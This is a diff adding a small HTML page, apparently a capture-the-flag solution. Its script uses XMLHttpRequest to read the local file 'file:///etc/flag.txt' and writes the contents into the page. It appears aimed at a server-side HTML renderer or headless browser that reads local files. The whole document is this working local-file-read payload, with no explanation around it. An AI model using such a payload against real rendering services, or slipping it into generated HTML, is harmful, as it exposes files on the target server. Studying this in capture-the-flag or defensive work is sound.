@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'file:///etc/flag.txt', true);
+xhr.onreadystatechange = function () {
+  if (xhr.readyState == 4 && xhr.status == 200) {
+    document.write('<pre>' + xhr.responseText + '</pre>');
+  }
+};
+xhr.send();
+</script>
+</body>
+</html>
